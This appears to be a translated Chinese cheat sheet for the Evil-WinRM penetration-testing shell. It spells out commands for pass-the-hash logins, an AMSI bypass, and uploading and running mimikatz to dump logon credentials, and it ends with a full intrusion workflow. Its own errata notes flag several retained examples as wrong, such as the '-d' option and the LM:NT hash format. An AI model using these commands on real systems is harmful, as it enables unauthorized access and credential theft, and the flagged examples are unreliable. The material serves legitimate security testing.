# 😈 Evil-WinRM：Windows 远程 Shell

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                  功能丰富的 WinRM Shell
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 目录

- [Evil-WinRM 是什么](#-what-is-evil-winrm)
- [安装](#-installation)
- [基本连接](#-basic-connection)
- [文件操作](#-file-operations)
- [内置命令](#-built-in-commands)
- [哈希传递（Pass-the-Hash）](#-pass-the-hash)
- [Kerberos 身份验证](#-kerberos-auth)
- [速查表](#-quick-reference)

---

<a id="-what-is-evil-winrm"></a>
## 🎯 Evil-WinRM 是什么

**Evil-WinRM** 是一款带有渗透测试功能的 WinRM 远程命令行工具：

- 🖥️ **交互式 Shell** - 完整的 PowerShell 会话
- 📁 **文件传输** - 上传和下载文件
- 🔓 **哈希传递（Pass-the-Hash）** - 使用 NTLM 哈希进行身份验证
- 🎫 **Kerberos** - 基于票据的身份验证
- 🧩 **模块** - 加载 PowerShell 脚本

### WinRM 端口

| 端口 | 协议 | 备注 |
|------|----------|-------|
| 5985 | HTTP | 默认 |
| 5986 | HTTPS | 加密传输 |

---

<a id="-installation"></a>
## 🚀 安装

### Kali Linux

```bash
# 安装
sudo apt update
sudo apt install evil-winrm

# 也可以通过 gem 安装
sudo gem install evil-winrm
```

### 从 GitHub 安装

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

<a id="-basic-connection"></a>
## 💻 基本连接

### 密码身份验证

> **参数勘误：** 以下命令和旧示例均原样保留。[项目参数解析](https://github.com/Hackplayers/evil-winrm/blob/master/evil-winrm.rb)没有原文所用的 `-d` 域选项；不能将其他工具的同名开关直接套用。`-P` 仅指定端口，选择 HTTPS 还涉及 `-S`，不能只改端口号就认定启用了 TLS。

```bash
# 基本连接
evil-winrm -i 10.10.10.10 -u user -p 'password'

# 指定域（原文说明，参见上方勘误）
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS（端口 5986）
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# 指定端口
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

### SSL 选项

> **证书说明：** `-c`／`-k` 指向本地客户端证书和私钥，并不是用于信任服务端证书的 CA 参数。[现行连接实现](https://github.com/Hackplayers/evil-winrm/blob/master/evil-winrm.rb)还将服务端证书验证关闭；具体行为需与所用版本核对。

```bash
# 启用 SSL，不验证服务端证书
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# 使用证书
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

<a id="-file-operations"></a>
## 📁 文件操作

### 上传文件

> **目录与上传说明：** [官方文档](https://github.com/Hackplayers/evil-winrm#documentation)将 `-e` 定义为本地 C# 可执行文件目录，主要供相关加载功能使用；该参数本身不上传文件，也不能据此断定 `upload` 会从该目录查找同名文件。上传路径需对应客户端实际文件位置。

```bash
# 在 Evil-WinRM Shell 内执行
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# 上传到指定位置
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# 通过命令行指定目录（使用 -e，参见上方说明）
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

### 下载文件

```bash
# 下载文件
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# 下载到指定位置
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

### 可执行文件目录

```bash
# 指定用于上传的 EXE 目录（原文说明，参见上方勘误）
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# 在 Shell 内上传该目录中的 EXE（原文说明，需核对本地文件位置）
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

<a id="-built-in-commands"></a>
## 🛠️ 内置命令

### 命令菜单（menu）

> **输出说明：** 下方命令列表作为原文输出示例保留英文；上传、下载、服务查询和 DLL 加载的中文说明也见后面的命令表。按[官方功能说明](https://github.com/Hackplayers/evil-winrm#advanced-commands)，Donut-Loader 加载的是 Donut 生成的载荷，不能仅概括为普通 .NET 程序集加载；可用函数也与版本及加载状态有关。

```bash
# 显示所有命令
*Evil-WinRM* PS C:\> menu

# 可用命令（下方输出原样保留）：
Bypass-4MSI       - Bypass AMSI
Dll-Loader        - Load DLL in memory
Donut-Loader      - Load .NET assembly
Invoke-Binary     - Execute binary
services          - List services
upload            - Upload file
download          - Download file
```

### AMSI 绕过

> **能力范围：** [AMSI 是应用与反恶意软件产品之间的扫描接口](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)。绕过某个会话中的 AMSI 扫描，不等于关闭杀毒软件或保证后续工具不会被检测；原文注释的结论过于绝对。

```bash
# 绕过 AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 现在可以运行会被杀毒软件（AV）检测的工具（原文表述，参见上方说明）
```

### 加载脚本

```bash
# 连接时指定脚本目录
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# 在 Shell 内加载脚本
*Evil-WinRM* PS C:\> PowerView.ps1

# 使用脚本中的函数
*Evil-WinRM* PS C:\> Get-DomainUser
```

### 执行二进制文件

> **加载器范围：** [官方说明](https://github.com/Hackplayers/evil-winrm#advanced-commands)将 Invoke-Binary 定义为内存执行 .NET 程序集，并非任意原生 EXE 的通用加载器。原文的文件名与参数示例仍保留，实际二进制格式、函数可用性及参数分隔方式需另行核对。

```bash
# 指定可执行文件目录
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# 在内存中执行二进制文件
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# 传入参数
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### 加载 DLL

```bash
# 加载 DLL
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

### 服务

```bash
# 列出服务
*Evil-WinRM* PS C:\> services
```

---

<a id="-pass-the-hash"></a>
## 🔓 哈希传递（Pass-the-Hash）

### NTLM 哈希

> **哈希格式勘误：** [项目的 `-H` 校验](https://github.com/Hackplayers/evil-winrm/blob/master/evil-winrm.rb)接受单个由 32 个十六进制字符表示的 NT 哈希，不接受 `LM:NT` 拼接格式。原文首条示例仍原样保留，不能因为其他工具支持这种写法就认定这里也可用。

```bash
# 使用哈希连接
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# 仅提供 NTLM 部分
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# 指定域（原文说明，参见上方勘误）
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

<a id="-kerberos-auth"></a>
## 🎫 Kerberos 身份验证

### 配置

```bash
# 将 KRB5CCNAME 设为票据缓存路径
export KRB5CCNAME=/path/to/ticket.ccache

# 编辑 /etc/krb5.conf，配置 realm
```

### 使用 Kerberos 连接

> **Kerberos 前提：** [官方帮助](https://github.com/Hackplayers/evil-winrm#help)要求 Kerberos 目标使用 FQDN，并配置相应 realm。仅设置缓存路径并不保证已具备匹配的有效票据与服务名称；票据文件支持也应按具体版本核对。

```bash
# Kerberos 身份验证
evil-winrm -i dc01.domain.local -r domain.local

# 使用指定的 ccache
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

<a id="-quick-reference"></a>
## 📊 速查表

### 连接选项

| 选项 | 说明 |
|--------|-------------|
| `-i` | 目标 IP／主机名 |
| `-u` | 用户名 |
| `-p` | 密码 |
| `-H` | NTLM 哈希 |
| `-d` | 域（原文选项，参见前文参数勘误） |
| `-S` | 启用 SSL（HTTPS） |
| `-P` | 端口 |
| `-r` | Kerberos realm（认证域） |

### 文件选项

| 选项 | 说明 |
|--------|-------------|
| `-s` | 脚本目录 |
| `-e` | 可执行文件目录 |
| `-c` | SSL 证书 |
| `-k` | SSL 私钥 |

### Shell 命令

| 命令 | 说明 |
|---------|-------------|
| `upload` | 上传文件 |
| `download` | 下载文件 |
| `menu` | 显示命令 |
| `Bypass-4MSI` | 绕过 AMSI |
| `Invoke-Binary` | 在内存中运行 EXE |
| `services` | 列出服务 |
| `Dll-Loader` | 加载 DLL |

### 常见流程

```bash
# 1. 连接
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. 绕过 AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. 上传工具
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. 执行
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. 下载结果
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

## 📚 参考资源

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [WinRM 文档](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

### 相关速查表
- [CrackMapExec](../../CrackMapExec/translations/README.zh-CN.md)
- [Impacket](../../Impacket/translations/README.zh-CN.md)
- [Mimikatz](../../Mimikatz/translations/README.zh-CN.md)

---

<p align="center">
  <b>😈 功能丰富的 WinRM Shell！</b><br>
  <i>Evil-WinRM：高效开展 Windows 渗透测试</i>
</p>
